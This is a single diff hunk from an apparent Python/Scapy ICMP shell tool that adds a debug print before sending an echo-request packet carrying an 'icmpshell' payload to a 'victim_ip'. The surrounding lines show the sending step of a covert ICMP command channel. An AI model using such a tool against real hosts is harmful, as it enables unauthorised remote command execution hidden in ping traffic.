@@ -41,6 +41,7 @@ def main():
             pass
         else:
             payload = (IP(dst=args.victim_ip, ttl=TTL)/ICMP(type=8,id=ICMP_ID)/Raw(load=icmpshell))
+            print(f"the payload is {payload}")
             sr(payload, timeout=0, verbose=0)
     sniffing.join()
 
